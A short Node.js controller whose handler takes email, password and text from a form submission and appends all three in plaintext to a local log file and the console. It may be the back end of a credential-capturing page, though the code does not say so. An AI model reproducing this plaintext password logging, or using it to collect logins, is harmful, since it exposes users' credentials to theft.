const fs = require('fs');

class PostControllers {
    index(req, res){
        const { email, password, text } = req.body;
        const now = new Date();

        const time_current = now.toLocaleDateString();
        const time = `Date: ${time_current}, ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
        const logdata = `[${time}], Email: ${email}, Password: ${password}, Text: ${text}\n`;

        fs.appendFile('data.log', logdata, (err) => {
            if (err) {
                console.error("Error writing to log file", err);
                res.status(500).send('Server error');
            } else {
                console.log(logdata);
                res.render('post');
            }
        });
    }
}

module.exports = new PostControllers();
